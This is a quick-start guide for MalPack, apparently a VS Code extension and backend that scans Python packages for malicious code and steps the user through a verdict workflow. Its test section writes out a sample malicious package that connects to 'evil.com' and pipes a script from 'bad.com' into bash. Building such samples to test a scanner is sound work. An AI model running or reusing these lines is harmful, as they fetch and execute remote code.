# MalPack Extension - Quick Start Guide

## Running the Complete Workflow

### 1. Start the Backend (Terminal 1)

```bash
cd /home/swadhin/Desktop/MalPack/backend
source venv/bin/activate
uvicorn app.main:app --reload
```

**✅ Backend Status:** Currently running on http://localhost:8000

### 2. Test the Extension

#### Option A: Launch Extension Development Host

1. Open `/home/swadhin/Desktop/MalPack/extension` folder in VS Code
2. Press `F5` to start Extension Development Host
3. In the new window, run: `Ctrl+Shift+P` → `MalPack: Install Package`
4. Enter a package name to test

#### Option B: Package and Install Extension

```bash
cd /home/swadhin/Desktop/MalPack/extension
npm run compile
vsce package
code --install-extension malpack-0.0.1.vsix
```

### 3. Test Workflow Stages

**Test with a simple package:**
- Enter: `colorama` (benign package)
- Watch the workflow:
  - ⏳ Downloading...
  - 🔍 Scanning...
  - ✅ Verdict: BENIGN
  - 📦 Install? → Files cleaned up

**Test with malicious code (create test package):**

```bash
# Create test malicious package
cd /tmp
mkdir evil_package
cd evil_package
cat > __init__.py << 'EOF'
import os
import socket

# Malicious: Connect to external server
s = socket.socket()
s.connect(("evil.com", 443))

# Malicious: Execute shell command
os.system("curl http://bad.com/steal.sh | bash")
EOF

# Note: Use this with caution - only for testing!
```

### 4. Expected Workflow

```
┌─────────────────────────────────────┐
│  STAGE 1: Verdict Panel             │
│  ⚠️  MALICIOUS PACKAGE DETECTED      │
│  package-name                        │
│  Total Issues: 5                     │
│  [Show Details] [Block Installation] │
└─────────────────────────────────────┘
                  ↓
┌─────────────────────────────────────┐
│  STAGE 2: High-Level Details        │
│  ⚠️  Security Issues Detected        │
│                                      │
│  [CRITICAL] Shell command execution  │
│  [CRITICAL] Network connection       │
│  [WARNING] Suspicious file access    │
│                                      │
│  [Show in Code] [Back] [Block]       │
└─────────────────────────────────────┘
                  ↓
┌─────────────────────────────────────┐
│  STAGE 3: Code-Level View            │
│  Editor opens with:                  │
│  - Red boxes around malicious code   │
│  - Hover tooltips with details       │
│  - Problems panel with all findings  │
└─────────────────────────────────────┘
                  ↓
┌─────────────────────────────────────┐
│  STAGE 4: Final Confirmation         │
│  ⚠️  package contains malicious code │
│  Do you want to install it anyway?   │
│  [Install] [Cancel]                  │
│  → Files automatically cleaned up    │
└─────────────────────────────────────┘
```

### 5. Verify Cleanup

After any installation decision:
```bash
# Check that temp files are removed
ls /home/swadhin/Desktop/MalPack/malpack_analysis/
# Should be empty or not exist
```

## Troubleshooting

### Backend Not Running
```bash
# Check if backend is running
curl http://localhost:8000/
# Should return: {"status": "MalPack Backend Running"}
```

### Extension Not Compiling
```bash
cd /home/swadhin/Desktop/MalPack/extension
npm install
npm run compile
```

### No Files Found
- Make sure the package has `.py`, `.js`, or `.json` files
- Check the extracted directory structure

## What to Test

- ✅ Malicious package detection
- ✅ Benign package pass-through
- ✅ Navigation between stages
- ✅ Red box decorations on code
- ✅ Hover tooltips
- ✅ Automatic cleanup after decision
- ✅ Install flow (terminal opens)
- ✅ Cancel flow (no installation)

## Next Steps

Once you've verified the workflow:
1. Test with real packages from PyPI
2. Add more malicious patterns to detection rules
3. Customize UI themes in webviewProvider.ts
4. Add settings for scan sensitivity
